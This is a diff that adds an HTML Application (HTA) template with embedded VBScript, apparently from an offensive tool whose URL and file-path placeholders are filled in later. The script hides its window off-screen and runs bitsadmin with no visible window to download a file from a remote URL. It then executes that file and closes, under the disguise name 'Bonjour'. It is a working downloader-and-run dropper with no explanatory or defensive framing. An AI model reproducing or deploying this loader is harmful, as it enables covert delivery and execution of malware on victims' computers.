@@ -1,0 +1,23 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+    <script language="VBScript">
+      Window.ReSizeTo 0, 0
+      Window.MoveTo -4000, -4000
+
+set runn = CreateObject("WScript.Shell")
+dim file
+file = "%pathh%" & "\%filename%"
+const DontWaitUntilFinished = false, ShowWindow = 1, DontShowWindow = 0, WaitUntilFinished = true
+set oShell = CreateObject("WScript.Shell")
+oShell.Run "bitsadmin /transfer 8 %url% " & file, DontShowWindow, WaitUntilFinished
+runn.Run file
+	 Close
+    </script>
+    <hta:application id="oHTA" applicationname="Bonjour" application="yes" width="10px" height="10px"></hta:application>
+  </head>
+  <body>
+  </body>
+</html>
+
